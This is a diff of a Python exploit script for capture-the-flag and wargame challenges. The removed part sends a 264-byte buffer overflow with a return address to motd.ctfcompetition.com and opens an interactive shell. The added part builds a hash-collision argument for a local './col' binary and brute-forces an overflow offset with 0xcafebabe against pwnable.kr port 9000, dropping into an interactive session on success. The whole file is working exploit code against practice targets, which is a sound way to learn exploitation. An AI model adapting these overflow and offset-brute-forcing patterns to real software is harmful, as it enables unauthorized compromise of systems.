@@ -1,121 +1,64 @@
 #!/usr/bin/python
 import random
 import sys
-import socket
-import telnetlib
 import os
 import time
 import threading
-from struct import pack, unpack
+import struct
 from time import time
-
-from unicorn import *
-from unicorn.arm64_const import *
-
-def recvuntil(sock, txt):
-  d = ""
-  while d.find(txt) == -1:
-    try:
-      dnow = sock.recv(1)
-      if len(dnow) == 0:
-        return ("DISCONNECTED", d)
-    except socket.timeout:
-      return ("TIMEOUT", d)
-    except socket.error as msg:
-      return ("ERROR", d)
-    d += dnow
-  return ("OK", d)
-
-def recvall(sock, n):
-  d = ""
-  while len(d) != n:
-    try:
-      dnow = sock.recv(n - len(d))
-      if len(dnow) == 0:
-        return ("DISCONNECTED", d)
-    except socket.timeout:
-      return ("TIMEOUT", d)
-    except socket.error as msg:
-      return ("ERROR", d)
-    d += dnow
-  return ("OK", d)
-
-# Proxy object for sockets.
-class gsocket(object):
-  def __init__(self, *p):
-    self._sock = socket.socket(*p)
-
-  def __getattr__(self, name):
-    return getattr(self._sock, name)
-
-  def recvall(self, n):
-    err, ret = recvall(self._sock, n)
-    if err != "OK":
-      return False
-    return ret
-
-  def recvuntil(self, txt):
-    err, ret = recvuntil(self._sock, txt)
-    if err != "OK":
-      return False
-    return ret
+from pwn import *
 
 # Base for any of my ROPs.
 def db(v):
-  return pack("<B", v)
+  return struct.pack("<B", v)
 
 def dw(v):
-  return pack("<H", v)
+  return struct.pack("<H", v)
 
 def dd(v):
-  return pack("<I", v)
+  return struct.pack("<I", v)
 
 def dq(v):
-  return pack("<Q", v)
+  return struct.pack("<Q", v)
 
 def rb(v):
-  return unpack("<B", v[0])[0]
+  return struct.unpack("<B", v[0])[0]
 
 def rw(v):
-  return unpack("<H", v[:2])[0]
+  return struct.unpack("<H", v[:2])[0]
 
 def rd(v):
-  return unpack("<I", v[:4])[0]
+  return struct.unpack("<I", v[:4])[0]
 
 def rq(v):
-  return unpack("<Q", v[:8])[0]
-
-def go():
-    global HOST
-    global PORT
-    s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((HOST, PORT))
-    #ln = s.recvuntil('\n')
-
-    # Put your code here!
-    s.sendall('2\n')
-    s.sendall('A' * 264 + dq(0x00606063A5) + '\n')  
-
-    # Interactive sockets.
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-
-    # Python console.
-    # Note: you might need to modify ReceiverClass if you want
-    #       to parse incoming packets.
-    #ReceiverClass(s).start()
-    #dct = locals()
-    #for k in globals().keys():
-    #  if k not in dct:
-    #    dct[k] = globals()[k]
-    #code.InteractiveConsole(dct).interact()
-
-    #s.shutdown(socket.SHUT_RDWR)  # SD_...
-    s.close()
-
-HOST = 'motd.ctfcompetition.com' 
-PORT = 1337
-go()
+  return struct.unpack("<Q", v[:8])[0]
 
 
+
+def f_local():
+    payload = dd(0x01010101) * 4
+    payload += dd(0x1DD905E8)
+
+    arguments = ['./col', payload]
+    print arguments
+    t = process(argv=arguments)
+    rcv = t.recvall()
+    print rcv
+
+def f_remote():
+    host = 'pwnable.kr'
+    port = 9000
+
+    for i in xrange(32, 100, 4):
+        r = remote(host, port)
+        r.sendline('a' * i + dd(0xcafebabe))
+        resp = r.recv(1024, timeout=1)
+        if resp == '':
+            print("Hit offset: " + str(i))
+            r.interactive()
+        else:
+            print("Offset " + str(i) + " failed")
+            r.close()
+
+
+f_remote()
